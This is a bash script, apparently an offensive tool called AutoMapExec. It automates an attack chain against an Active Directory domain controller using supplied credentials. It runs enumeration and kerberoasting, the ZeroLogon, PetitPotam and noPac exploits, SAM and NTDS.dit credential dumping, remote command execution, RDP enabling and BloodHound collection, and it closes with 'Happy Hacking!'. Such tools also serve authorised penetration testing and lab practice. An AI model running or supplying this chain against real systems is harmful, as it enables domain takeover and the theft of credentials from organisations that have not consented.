#!/bin/bash
# Author: EmreKybs
# Github: https://github.com/emrekybs 

RED='\033[0;31m'
BLUE='\033[0;34m'
YELLOW='\033[0;33m'
GREEN='\033[0;32m'
NC='\033[0m' 


RED_LINE="${RED}================================================================================${NC}"

clear

frame_top_bottom="${RED}+--------------------------------------------------------------+${NC}"
empty_line="                                                              "


echo -e "$frame_top_bottom"
echo -e "$empty_line"
echo -e "    ${GREEN}☠ 𝗔𝘂𝘁𝗼${BLUE}𝗠𝗮𝗽${RED}𝗘𝘅𝗲𝗰 ☠${NC}     "
echo -e "$empty_line"


echo -e "$frame_top_bottom"
echo -e "$empty_line"
echo -e "${YELLOW}Automates the process of network mapping and security scanning${NC}"
echo -e "${YELLOW}by utilizing the capabilities of NetExec-CrackMapExec And SlientHound tools${NC}"
echo -e "$empty_line"


echo -e "${GREEN}↤↤↤↤↤ Author: Emrekybs ↦↦↦↦↦${NC}"
echo -e "${GREEN}↤↤↤↤↤ Github: https://github.com/emrekybs ↦↦↦↦↦${NC}"
echo -e "$frame_top_bottom"

read -p "Enter the domain (e.g., htb.local): " domain
read -p "Enter the Domain Controller IP (e.g., 10.0.2.13): " dc_ip
read -p "Enter the username: " username
read -p "Enter the password: " password

# Quietly enumerate an Active Directory Domain via LDAP parsing users, admins, groups, etc
silenthound_cmd="silenthound $dc_ip $domain -g -n -k --kerberoast"

# NetExec command for local authentication
netexec_userslocalauth_cmd="netexec smb $dc_ip -u '$username' -p '$password' --local-auth"

# NetExec command for enumerating shares
netexec_shares_cmd="netexec smb $dc_ip -u '$username' -p '$password' --shares"

# CrackMapExec command for listing computers
cme_computers_cmd="crackmapexec smb $dc_ip -u '$username' -p '$password' --computers"

# NetExec command for enumerating users
netexec_users_cmd="netexec smb $dc_ip -u '$username' -p '$password' --users"

# NetExec command for enumerating domain groups
netexec_groups_cmd="netexec smb $dc_ip -u '$username' -p '$password' --groups"

# CrackMapExec command for listing local groups
cme_localgroups_cmd="crackmapexec smb $dc_ip -u '$username' -p '$password' --local-groups"

# NetExec command for RID bruteforce
netexec_ridbrute_cmd="netexec smb $dc_ip -u '$username' -p '$password' --rid-brute"

# NetExec command for enumerating sessions
netexec_sessions_cmd="netexec smb $dc_ip -u '$username' -p '$password' --sessions"

# NetExec command for getting password policy
netexec_passpol_cmd="netexec smb $dc_ip -u '$username' -p '$password' --pass-pol"

# netexec command for enum_av
netexec_enum_av_cmd="netexec smb $dc_ip -u '$username' -p '$password' -M enum_av"

# ZeroLogon
zerologon_cmd="nxc smb $dc_ip -u '$username' -p '$password' -M zerologon"

# PetitPotam
petitpatom_cmd="nxc smb $dc_ip -u '$username' -p '$password' -M petitpotam"

# netexec command for nopac
netexec_nopac_cmd="netexec smb $dc_ip -u '$username' -p '$password' -M nopac"

# NetExec command for getting SAM database with local authentication
netexec_sam_local_auth_cmd="netexec smb $dc_ip -u '$username' -p '$password' --local-auth --sam"

# NetExec command for getting SAM database without local authentication
netexec_sam_cmd="netexec smb $dc_ip -u '$username' -p '$password' --sam"

# NetExec command to execute command through cmd.exe
netexec_exec_cmd_whoami="netexec smb $dc_ip -u '$username' -p '$password' -x 'whoami'"

# NetExec command to check logged users and force logoff
netexec_exec_cmd_quser="netexec smb $dc_ip -u '$username' -p '$password' -x 'quser'"

# CrackMapExec command for NTDS extraction using VSS
cme_ntds_vss_cmd="crackmapexec smb $dc_ip -u '$username' -p '$password' --ntds vss"

# CrackMapExec command for enabling RDP
cme_enable_rdp_cmd="crackmapexec smb $dc_ip -u '$username' -p '$password' -M rdp -o ACTION=enable"

# BloodHound-python command
bloodhound_cmd="bloodhound-python -d $domain -u $username -p $password -ns $dc_ip -c All"

# xfreerdp command with variables
xfreerdp_cmd="xfreerdp /d:$domain /u:'$username' /p:'$password' /v:$dc_ip /drive:.,kali-share +clipboard"

# silenthound
echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}|     +---SilentHound---+           |${NC}"
echo -e "${BLUE}| This command runs the SilentHound |${NC}"
echo -e "${BLUE}| script for advanced Kerberos      |${NC}"
echo -e "${BLUE}| auditing and exploitation.        |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $silenthound_cmd
echo -e "$RED_LINE"

# Execute NetExec command with explanation
echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}|  +---NetExec Local Auth---+       |${NC}"
echo -e "${BLUE}| Execute NetExec for local         |${NC}"
echo -e "${BLUE}| authentication on SMB.            |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $netexec_userslocalauth_cmd
sleep 1
echo -e "$RED_LINE"

# Execute NetExec command for shares with explanation
echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}|  +---NetExec Shares---+           |${NC}"
echo -e "${BLUE}| Enumerate SMB shares using        |${NC}"
echo -e "${BLUE}| NetExec.                          |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $netexec_shares_cmd
sleep 1
echo -e "$RED_LINE"

# Execute command to list computers with explanation
echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}|  +---Listing Computers---+        |${NC}"
echo -e "${BLUE}| List all computers in the domain. |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $cme_computers_cmd
sleep 1
echo -e "$RED_LINE"

# Execute NetExec commands with explanations
echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}|   +---Enumerating Users---+       |${NC}"
echo -e "${BLUE}| Enumerate domain users using      |${NC}"
echo -e "${BLUE}| NetExec.                          |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $netexec_users_cmd
sleep 1
echo -e "$RED_LINE"

#Groups
echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}|  +---Enumerating Groups---+       |${NC}"
echo -e "${BLUE}| Enumerate domain groups using     |${NC}"
echo -e "${BLUE}| NetExec.                         |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $netexec_groups_cmd
sleep 1
echo -e "$RED_LINE"


# Execute command to list local groups with explanation
echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}|  +---Listing Local Groups---+     |${NC}"
echo -e "${BLUE}| List all local groups on the      |${NC}"
echo -e "${BLUE}| target machine.                   |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $cme_localgroups_cmd
sleep 1
echo -e "$RED_LINE"

# RID Bruteforce
echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}|   +---RID Bruteforce---+          |${NC}"
echo -e "${BLUE}| Perform RID bruteforce to get     |${NC}"
echo -e "${BLUE}| user accounts.                    |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $netexec_ridbrute_cmd
sleep 1
echo -e "$RED_LINE"

# Enumerate Sessions
echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}|   +---Enumerating Sessions---+    |${NC}"
echo -e "${BLUE}| Get the active sessions using     |${NC}"
echo -e "${BLUE}| NetExec.                          |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $netexec_sessions_cmd
sleep 1
echo -e "$RED_LINE"

# Execute command to get password policy with explanation
echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}| +---Getting Password Policy---+   |${NC}"
echo -e "${BLUE}| Get the password policy using     |${NC}"
echo -e "${BLUE}| NetExec.                          |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $netexec_passpol_cmd
sleep 1
echo -e "$RED_LINE"

# Execute netexec command for enum_av with explanation
echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}|  +---Executing enum_av Module---+ |${NC}"
echo -e "${BLUE}| Enumerate antivirus software on   |${NC}"
echo -e "${BLUE}| the target SMB server.            |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $netexec_enum_av_cmd
sleep 1
echo -e "$RED_LINE"

# Execute Zerologon attack command with explanation
echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}|       +---Zerologon Attack---+    |${NC}"
echo -e "${BLUE}| This command attempts to exploit  |${NC}"
echo -e "${BLUE}| the Zerologon vulnerability in    |${NC}"
echo -e "${BLUE}| Windows Netlogon to reset the     |${NC}"
echo -e "${BLUE}| Domain Controller account         |${NC}"
echo -e "${BLUE}| passwords.                        |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $zerologon_cmd
sleep 1
echo -e "$RED_LINE"

# Execute PetitPotam attack command with explanation
echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}|       +---PetitPotam Attack---+   |${NC}"
echo -e "${BLUE}| This command uses the PetitPotam  |${NC}"
echo -e "${BLUE}| method to coerce Windows machines |${NC}"
echo -e "${BLUE}| into authenticating to a rogue    |${NC}"
echo -e "${BLUE}| NTLM server.                      |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $petitpatom_cmd
sleep 1
echo -e "$RED_LINE"

# Execute netexec command for nopac with explanation
echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}|  +---Executing nopac Module---+   |${NC}"
echo -e "${BLUE}| Attempt to bypass PAC validation  |${NC}"
echo -e "${BLUE}| on the target SMB server.         |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $netexec_nopac_cmd
sleep 1
echo -e "$RED_LINE"

# Execute command to get SAM database with local authentication
echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}|  +---SAM with Local Auth---+      |${NC}"
echo -e "${BLUE}| Retrieve SAM database using       |${NC}"
echo -e "${BLUE}| local authentication.             |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $netexec_sam_local_auth_cmd
sleep 1
echo -e "$RED_LINE"

# Execute command to get SAM database without local authentication
echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}|  +---SAM without Local Auth---+   |${NC}"
echo -e "${BLUE}| Retrieve SAM database without     |${NC}"
echo -e "${BLUE}| local authentication.             |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $netexec_sam_cmd
sleep 1
echo -e "$RED_LINE"

# Execute command to run 'whoami' with explanation
echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}|  +---CMD: whoami---+              |${NC}"
echo -e "${BLUE}| Execute command through cmd.exe.  |${NC}"
echo -e "${BLUE}| Admin privileges required.        |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $netexec_exec_cmd_whoami
echo -e "$RED_LINE"

# Execute command to check logged users and force logoff
echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}|  +---CMD: quser---+               |${NC}"
echo -e "${BLUE}| Check logged users and force      |${NC}"
echo -e "${BLUE}| logoff.                           |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $netexec_exec_cmd_quser
sleep 1
echo -e "$RED_LINE"

# Execute command for NTDS extraction with explanation
echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}|  +---NTDS Extraction (VSS)---+    |${NC}"
echo -e "${BLUE}| Extract NTDS.dit using VSS method |${NC}"
echo -e "${BLUE}| with CrackMapExec.                |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $cme_ntds_vss_cmd
sleep 1
echo -e "$RED_LINE"

# Execute command to enable RDP with explanation
echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}|  +---Enabling RDP---+             |${NC}"
echo -e "${BLUE}| Enable Remote Desktop Protocol    |${NC}"
echo -e "${BLUE}| (RDP) on the target machine.      |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $cme_enable_rdp_cmd
sleep 1
echo -e "$RED_LINE"

# Execute BloodHound-python command with explanation
echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}|  +---Executing BloodHound---+     |${NC}"
echo -e "${BLUE}| Collect AD data for BloodHound    |${NC}"
echo -e "${BLUE}| analysis.                         |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $bloodhound_cmd
sleep 1
echo -e "$RED_LINE"

# Execute xfreerdp command with explanation
echo -e "${BLUE}+-----------------------------------+${NC}"
echo -e "${BLUE}|  +---Starting FreeRDP Session---+ |${NC}"
echo -e "${BLUE}| Connect to a remote desktop using |${NC}"
echo -e "${BLUE}| FreeRDP.                          |${NC}"
echo -e "${BLUE}+-----------------------------------+${NC}"
eval $xfreerdp_cmd

echo -e "$RED_LINE"

echo -e "${RED}All commands executed successfully.${NC}"
echo -e "${GREEN}Happy Hacking!${NC}"
